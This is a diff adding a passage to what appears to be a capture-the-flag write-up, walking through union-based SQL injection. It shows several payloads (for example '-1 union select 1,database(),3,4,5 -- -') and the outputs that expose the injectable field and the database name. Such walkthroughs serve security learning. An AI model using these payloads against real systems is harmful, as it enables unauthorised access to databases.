@@ -111,6 +111,23 @@ Continue
 
 ```
 
+##### First lets try Union Based Injection.
+
+`1 union select 1,2,3,4,database() -- -`   #No erro (loadpage normally)
+
+Remember to invalidate the first input as i did by making it `-1`
+
+`-1 union select 1,2,3,4,database() -- -`
+
+OUTPUT: Username is : 2
+
+2 is reference to the injectable field
+
+`-1 union select 1,database(),3,4,5 -- -`
+
+OUTPUT: Username is : leettime_761wHole
+
+
 
 
 
